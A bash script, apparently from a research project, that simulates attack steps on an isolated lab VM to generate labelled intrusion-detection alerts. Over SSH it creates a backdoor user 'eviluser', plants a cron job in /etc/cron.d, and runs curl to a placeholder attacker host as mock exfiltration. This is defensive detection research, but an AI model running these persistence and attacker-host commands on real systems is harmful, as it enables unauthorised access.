#!/bin/bash
# =====================================================================
# ATTACK SIMULATION SCRIPT — CONTROLLED LAB USE ONLY
# Part of NICS project G1140705 sub-project 4 (IDS -> CTI Kill-Chain).
# Purpose: generate labelled IDS/HIDS alerts on an ISOLATED testbed VM.
# Network addresses and credentials are placeholders (<TARGET_IP>,
# <ATTACKER_IP>, <TARGET_PASSWORD>) — set them for your own lab.
# Destructive artefacts have been neutralised; lines marked NEUTRALIZED
# show what the original simulation wrote. Do NOT run outside a
# disposable virtual machine.
# =====================================================================


TARGET_IP="<TARGET_IP>"     # Ubuntu IP
TARGET_USER="user"             # Ubuntu username
ATTACKER_IP="<ATTACKER_IP>"   # Kali IP

echo "[+] Starting attack simulation - Phase 2"

# 1. SSH into target and create persistence user
echo "[+] Creating persistence user (eviluser)..."
ssh ${TARGET_USER}@${TARGET_IP} 'sudo useradd -m eviluser && echo "[+] User added."'

# 2. Add cron job
echo "[+] Adding cron job..."
ssh ${TARGET_USER}@${TARGET_IP} 'echo "* * * * * echo pwned >> /tmp/cronlog.txt" | sudo tee /etc/cron.d/pwned_job'

# 3. Simulate exfiltration using curl
echo "[+] Simulating data exfiltration over HTTP..."
ssh ${TARGET_USER}@${TARGET_IP} "curl http://${ATTACKER_IP}/fakefile.txt -o /dev/null"

echo "[+] Attack simulation (Phase 2) complete."

